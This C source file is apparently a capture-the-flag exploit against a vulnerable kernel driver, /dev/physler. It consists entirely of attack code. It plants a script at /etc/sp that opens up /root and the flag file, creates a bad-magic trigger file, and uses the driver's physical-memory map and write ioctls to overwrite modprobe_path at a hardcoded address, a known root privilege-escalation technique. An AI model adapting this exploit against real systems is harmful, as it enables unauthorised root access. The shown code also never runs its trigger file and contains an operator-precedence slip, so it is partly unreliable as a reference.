#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>

#define MAP 0x1001
#define WRITE 0x3003

#define MODPROBE_PHYS 0x2dd5820

static struct ioctl_map {
    unsigned long phys_addr;
    unsigned long size;
};

static struct ioctl_write {
    unsigned long size;
    unsigned char* in_data;
};


void create_sploit(){
    int file = open("/etc/sp", O_CREAT | O_WRONLY);
    char *sploit = "#!/bin/sh\n"
                   "chmod 777 /root/\n"
                   "chmod 777 /root/flag.txt";
    write(file, sploit, strlen(sploit));
    close(file);
    system("chmod 777 /etc/sp");

    file = open("/etc/ciao", O_CREAT | O_WRONLY);
    write(file, "\xff\xff\xff\xff", 4);
    close(file);
    system("chmod 777 /etc/ciao");
    return;
}


int main(){

    create_sploit();

    int challenge = open("/dev/physler",O_RDWR);
    if(challenge==-1){
        printf("error opening the challenge module. Errno: %d\n",errno);
    }

    struct ioctl_map payload;
    payload.phys_addr = MODPROBE_PHYS;
    payload.size = 8;

    int ret=0;
    if (ret = ioctl(challenge,MAP,&payload)==-1){
        printf("returncode %d\n",ret);
    }

    struct ioctl_write payload2;
    payload2.in_data="/etc/sp";
    payload2.size=8;

    ret = ioctl(challenge,WRITE,&payload2);
    if (ret==-1){
        printf("returncode %d\n",ret);
    }

    printf("helo\n");
    return 0;
}